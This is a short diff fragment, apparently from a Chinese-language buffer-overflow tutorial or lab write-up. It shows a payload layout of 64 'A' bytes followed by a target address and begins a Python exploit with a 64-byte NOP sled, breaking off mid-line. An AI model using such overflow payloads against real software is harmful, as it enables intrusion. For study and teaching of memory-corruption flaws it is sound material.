@@ -70,3 +70,11 @@ payload构造 ： ‘A’\*64 + target\(0xdeadbeef\)
 
 ![](/png/47.png)
 
+用python实现如下：
+
+import struct
+
+nosled = "\x90"\*64
+
+target = struct.
+
